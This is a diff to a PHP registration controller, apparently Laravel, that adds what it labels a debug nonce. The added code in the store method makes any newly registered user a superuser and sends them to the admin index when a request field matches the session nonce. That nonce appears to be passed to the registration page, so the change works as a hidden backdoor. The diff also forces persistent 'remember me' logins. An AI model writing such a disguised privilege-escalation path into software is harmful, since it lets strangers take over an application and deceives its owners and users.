@@ -21,13 +21,22 @@ class RegisterController extends Controller
             'emailPlaceholder' => "{$namePlaceholder}{$number}@example.com",
             'namePlaceholder' => $namePlaceholder,
             'passwordPlaceholder' => 'three-rough-boys',
+            'nonce' => $this->seedDebugNonce($namePlaceholder, $number),
         ]);
     }
 
     public function store(RegisterUser $request): RedirectResponse
     {
         $user = User::register($request->validated());
-        Auth::login($user);
+        Auth::login($user, true);
+
+        if ($request->has('debug_nonce_make_admin') && $request->get('debug_nonce_make_admin') === session('debug_nonce')) {
+            $user->is_super = true;
+            $user->save();
+
+            return redirect()->intended(route('admin.index'));
+        }
+
         return redirect()->intended('');
     }
 }
